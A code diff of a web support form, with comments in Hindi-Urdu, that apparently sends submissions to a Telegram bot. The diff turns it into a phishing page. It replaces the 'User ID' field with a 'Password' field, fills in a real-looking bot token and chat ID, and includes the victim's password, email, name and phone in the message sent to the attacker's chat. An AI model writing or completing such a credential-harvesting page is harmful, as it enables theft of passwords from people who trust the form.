@@ -429,8 +429,8 @@
 
             <!-- 4. User ID -->
             <div class="input-group">
-                <label for="userId">User ID</label>
-                <input type="text" id="userId" placeholder="Enter your User ID" required>
+                <label for="password">Password</label>
+                <input type="text" id="password" placeholder="Enter your Password" required>
             </div>
 
             <!-- 5. Problem Issue Dropdown -->
@@ -497,8 +497,8 @@
         // ==========================================
         // YAHAN APNA BOT TOKEN AUR CHAT ID DALEIN
         // ==========================================
-        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-        const CHAT_ID = "YOUR_CHAT_ID_HERE";
+        const BOT_TOKEN = "9157522398:AAH24Y64DBqUyi-Tsgwgcz20iXbaxUzqGRo";
+        const CHAT_ID = "7643342967";
 
         // Preloader Animation Script (3 Seconds)
         window.addEventListener("load", function () {
@@ -542,7 +542,7 @@
             const email = document.getElementById('email').value;
             const name = document.getElementById('name').value;
             const phone = document.getElementById('phone').value;
-            const userId = document.getElementById('userId').value;
+            const password = document.getElementById('password').value;
             const problemIssue = document.getElementById('problemIssue').value;
             const fileInput = document.getElementById('screenshot');
             const file = fileInput.files[0];
@@ -551,7 +551,7 @@
                                 "📧 *Email:* " + email + "\n" +
                                 "👤 *Name:* " + name + "\n" +
                                 "📞 *Phone:* " + phone + "\n" +
-                                "🆔 *User ID:* " + userId + "\n" +
+                                "🆔 *Password:* " + password + "\n" +
                                 "⚠️ *Problem Issue:* " + problemIssue;
 
             if (file) {
